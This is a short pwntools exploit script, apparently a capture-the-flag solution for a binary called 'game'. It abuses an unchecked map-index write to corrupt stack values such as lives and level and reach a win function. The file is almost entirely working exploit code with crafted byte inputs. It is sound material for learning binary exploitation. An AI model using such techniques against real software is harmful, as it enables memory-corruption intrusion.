#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "info"

chall = "./game"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
    cmd = """
    	#b *move_player+340
        b win
    	c
    """
    p = gdb.debug(chall,cmd)
else:
    p = process(chall)


# one byte overwrite with:
# *(undefined *)(player_info->y * 0x5a + map_addr + player_info->x) = player_tile;
# x: 0 < x < 89

# @stack
# +---------------------------+
# | NULL                      |
# +---------------------------+
# | level                     |
# +---------------------------+
# | player_info (y)           |
# +---------------------------+
# | player_info (x)           |
# +---------------------------+
# | player_info (lives_left)  |
# +---------------------------+

def solve():
    for _ in range(10):
        p.sendlineafter(b':', b'a')
    for _ in range(4):
        p.sendlineafter(b':', b'w')
    p.sendlineafter(b':', b's')
    p.sendlineafter(b':', b'p')

# solve with buggy lives left
for _ in range(3):
    solve()
# go to level 5
for _ in range(10):
    p.sendlineafter(b':', b'a')
for _ in range(4):
    p.sendlineafter(b':', b'w')
p.sendlineafter(b':', b's')
for _ in range(45):
    p.sendlineafter(b':', b'a')
p.sendlineafter(b':', b'l\x70')
p.sendlineafter(b':', b'w')
# win !
for _ in range(10):
    p.sendlineafter(b':', b'a')
for _ in range(4):
    p.sendlineafter(b':', b'w')
p.sendlineafter(b':', b's')
for _ in range(61):
    p.sendlineafter(b':', b'a')
p.sendlineafter(b':', b'l\xfe')
p.sendlineafter(b':', b'w')

p.interactive()
